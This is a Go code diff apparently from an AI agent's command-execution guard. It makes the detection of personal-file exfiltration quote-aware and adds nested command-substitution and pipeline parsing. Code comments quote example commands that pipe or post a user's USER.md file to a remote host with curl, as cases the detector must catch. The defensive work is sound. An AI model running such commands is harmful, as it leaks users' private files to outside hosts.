@@ -63,19 +63,81 @@ func (t *ExecTool) personalFilesSentTo(command, cwd string) string {
 // pipeline, so it stays where the stage's own outputs are dropped.
 var inputRedirectPattern = regexp.MustCompile(`<\s*[^\s<>|;&]+`)
 
-// commandSubstitutionPattern finds code the shell runs inside an argument,
-// `$(…)` or backticks, up to its first close.
-var commandSubstitutionPattern = regexp.MustCompile("\\$\\([^)]*\\)?|`[^`]*`?")
-
 // withoutWrittenFiles drops the files a command writes, keeping what a dropped
 // stage reads (`tee /tmp/x < USER.md | curl -d @- host` sends USER.md) and the
-// code it runs (`tee "$(curl -d @USER.md host)"`).
+// code it runs (`tee "$(curl -d @USER.md host)"`). A `>`, `-o` or `| tee`
+// inside quotes is text, not a write.
 func withoutWrittenFiles(text string) string {
-	return writtenFilePattern.ReplaceAllStringFunc(text, func(written string) string {
-		kept := append(inputRedirectPattern.FindAllString(written, -1),
-			commandSubstitutionPattern.FindAllString(written, -1)...)
-		return " " + strings.Join(kept, " ") + " "
-	})
+	quoted := quotedBytes(text)
+	var out strings.Builder
+	last := 0
+	for _, match := range writtenFilePattern.FindAllStringIndex(text, -1) {
+		written := text[match[0]:match[1]]
+		if quoted[match[0]+len(written)-len(strings.TrimLeft(written, " \t"))] {
+			continue
+		}
+		kept := append(inputRedirectPattern.FindAllString(written, -1), substitutions(written)...)
+		out.WriteString(text[last:match[0]] + " " + strings.Join(kept, " ") + " ")
+		last = match[1]
+	}
+	out.WriteString(text[last:])
+	return out.String()
+}
+
+// quotedBytes marks the bytes of text that sit inside single or double quotes.
+func quotedBytes(text string) []bool {
+	quoted := make([]bool, len(text)+1)
+	quote := byte(0)
+	for i := 0; i < len(text); i++ {
+		switch {
+		case quote != 0 && text[i] == quote:
+			quote = 0
+		case quote == 0 && (text[i] == '\'' || text[i] == '"'):
+			quote = text[i]
+		}
+		quoted[i] = quote != 0
+	}
+	return quoted
+}
+
+// substitutions finds the code the shell runs inside text: each `$(…)` with
+// the parentheses nested in it, and each backtick span, to its close or the end.
+func substitutions(text string) []string {
+	var found []string
+	for i := 0; i < len(text); i++ {
+		var last int
+		switch {
+		case strings.HasPrefix(text[i:], "$("):
+			last = closingParen(text, i+1)
+		case text[i] == '`':
+			last = len(text) - 1
+			if closing := strings.IndexByte(text[i+1:], '`'); closing >= 0 {
+				last = i + 1 + closing
+			}
+		default:
+			continue
+		}
+		found = append(found, text[i:last+1])
+		i = last
+	}
+	return found
+}
+
+// closingParen returns where the parenthesis opened at open closes, or the
+// last index when it never does.
+func closingParen(text string, open int) int {
+	depth := 0
+	for i := open; i < len(text); i++ {
+		switch text[i] {
+		case '(':
+			depth++
+		case ')':
+			if depth--; depth == 0 {
+				return i
+			}
+		}
+	}
+	return len(text) - 1
 }
 
 func remoteDestination(text string) string {
@@ -226,10 +288,6 @@ func (t *ExecTool) skillScriptsRun(command, cwd string) string {
 	return text.String()
 }
 
-// isSkillScript says whether path, once its links are resolved, is inside the
-// workspace and under skills/ or a loop's loops/<slug>/skills/. A skills/ that
-// links out of the workspace is not read: the refusal names a host, and one
-// from a file the agent cannot read must not leak.
 // interpreters run the file named by their first argument that is not an option.
 var interpreters = map[string]bool{
 	"sh": true, "bash": true, "zsh": true, "dash": true, "ksh": true, "source": true, ".": true,
@@ -241,25 +299,24 @@ var commandWrappers = map[string]bool{"sudo": true, "env": true, "exec": true, "
 
 // scriptsNamed lists the files a command may run: what it names with a script
 // extension, the file an interpreter is handed, and each stage's own program,
-// with or without an extension (`sh skills/x/backup`, `./skills/x/backup`).
+// with or without an extension (`sh skills/x/backup`, `./skills/x/backup`),
+// read as the shell reads words, so a quoted path with spaces stays whole.
 func scriptsNamed(command string) []string {
 	names := scriptPathPattern.FindAllString(command, maxScannedScripts)
-	for _, stage := range strings.Split(command, "|") {
-		fields := strings.Fields(stage)
-		for len(fields) > 0 && (commandWrappers[fields[0]] || strings.Contains(fields[0], "=")) {
-			fields = fields[1:]
+	for _, words := range pipelineStages(command) {
+		for len(words) > 0 && (commandWrappers[words[0]] || strings.Contains(words[0], "=")) {
+			words = words[1:]
 		}
-		if len(fields) == 0 {
+		if len(words) == 0 {
 			continue
 		}
-		program := strings.Trim(fields[0], `'"`)
-		if !interpreters[filepath.Base(program)] {
-			names = append(names, program)
+		if !interpreters[filepath.Base(words[0])] {
+			names = append(names, words[0])
 			continue
 		}
-		for _, field := range fields[1:] {
-			if !strings.HasPrefix(field, "-") {
-				names = append(names, strings.Trim(field, `'"`))
+		for _, word := range words[1:] {
+			if !strings.HasPrefix(word, "-") {
+				names = append(names, word)
 				break
 			}
 		}
@@ -270,6 +327,56 @@ func scriptsNamed(command string) []string {
 	return names
 }
 
+// pipelineStages splits a command at its unquoted pipes into the words of each
+// stage, as the shell reads them: quotes group and are dropped, a backslash
+// keeps the next character.
+func pipelineStages(command string) [][]string {
+	var stages [][]string
+	var words []string
+	var word strings.Builder
+	inWord := false
+	quote := byte(0)
+	flush := func() {
+		if inWord {
+			words = append(words, word.String())
+			word.Reset()
+			inWord = false
+		}
+	}
+	for i := 0; i < len(command); i++ {
+		c := command[i]
+		switch {
+		case quote != 0:
+			if c == quote {
+				quote = 0
+			} else {
+				word.WriteByte(c)
+			}
+		case c == '\'' || c == '"':
+			quote, inWord = c, true
+		case c == '\\' && i+1 < len(command):
+			i++
+			word.WriteByte(command[i])
+			inWord = true
+		case c == ' ' || c == '\t' || c == '\n':
+			flush()
+		case c == '|':
+			flush()
+			stages = append(stages, words)
+			words = nil
+		default:
+			word.WriteByte(c)
+			inWord = true
+		}
+	}
+	flush()
+	return append(stages, words)
+}
+
+// isSkillScript says whether path, once its links are resolved, is inside the
+// workspace and under skills/ or a loop's loops/<slug>/skills/. A skills/ that
+// links out of the workspace is not read: the refusal names a host, and one
+// from a file the agent cannot read must not leak.
 func isSkillScript(path, workspace string) bool {
 	resolved, err := filepath.EvalSymlinks(path)
 	if err != nil {
